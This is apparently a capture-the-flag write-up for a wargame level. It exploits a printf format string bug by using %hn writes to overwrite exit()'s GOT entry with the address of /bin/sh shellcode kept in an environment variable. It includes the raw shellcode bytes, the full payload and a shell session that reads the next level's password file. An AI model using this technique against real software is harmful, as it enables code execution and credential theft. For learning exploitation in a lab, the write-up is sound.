1. Basically the program does a `tolower()` on each character. But it is f no use here

2. The vulnerability is a single format string, as the printf takes the buffer as argument instead of a format string.

3. The attack will consist in erasing the address of the `exit()` function in the GOT table at `0x80497e0` (see below), with the address of a shellcode located in an env variable :

when we disas the main, at the bottom :

```
...
   0x08048507 <+195>:	call   0x8048340 <printf@plt>
   0x0804850c <+200>:	mov    DWORD PTR [esp],0x0
   0x08048513 <+207>:	call   0x8048370 <exit@plt>
```

Then we disass at address of exit:

```
(gdb) disas 0x08048370
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:	jmp    DWORD PTR ds:0x80497e0
   0x08048376 <+6>:	push   0x18
   0x0804837b <+11>:	jmp    0x8048330
End of assembler dump.
```

and find the address of the exit function in the Global Offset Table.

4. The exploit:
    - We first create an env variable with 20 (random) NOP instructions (to make for the discrepancy between stack level in gdb and outside gdb) :

    ```
    export SHELLCODE=`python -c 'print("\x90"*20 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh")'`
    ```

    - Then we find the address of this environment variable thanks to gdb:

    ```
    Breakpoint 1, 0x08048449 in main ()
    (gdb) x/30s (*(char**)environ)
    0xffffd85d: "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\353\037^\211v\b1\300\210F\a\211F\f\260\v\211\363\215N\b\215V\f̀1ۉ\330@̀\350\334\377\377\377/bin/sh"
    0xffffd8a9:	 "SHELL=/bin/bash"
    0xffffd8b9:	 "TERM=xterm-256color"
    ```

    So our Shellcode is at `0xffffd85d`. 

    - We will erase the instruction pointed to by `0x80497e0` with an address inside the NOP suite of instructions. So let's take `0xffffd86d` (+16 bytes)

    - We will use the %n modifier in printf to write, at the address of `exit()` in the GOT, the number of characters which corresponds to the address of our shellcode!

    - The buffer is located at $esp + 40 bytes. The argument of printf is at $esp. We will write teh first address to which we are going to write %n at the beginning of our buffer. It is therefore the `40 / 4 = 10th argument to printf`.

    - So we have to write `0xffffd86d at the address 0x80497e0`. But this **number is too large, we have to split it into 2 short int (written on 2 bytes**). We will therefore write `0xd86d or 55405` on the 2 bytes starting at `0x80497e0`, and `0xffff or 65535` on the 2 bytes starting at `0x80497e2`

    - our buffer: It will start with the address of the lower number to be written, followed by the 2nd address, then the corresponding modifiers:
        * 0x80497e0 => **4 bytes**
        * 0x80497e2 => **4 bytes**
        * %55397d  => **corresponds to `55405 - 8 bytes of already written characters`**
        * %10$hn => 10th argument, to get the address stored 40 bytes away in the stack (beginning of our buffer); `hn` is for `half-word or 2bytes (short int)`
        * %10130d => **corresponds to 65535 - 55405 characters already written**
        * %11$hn => 11th argument, the 2nd address

    - Payload and result:

    `(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55397d%10$hn" + "%10130d%11$hn")'; cat) | ./level05`
    
    ```
                                                                                                                                                                 -134415680
    whoami
    level06
    cat /home/users/level06/.pass
    h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
    ```


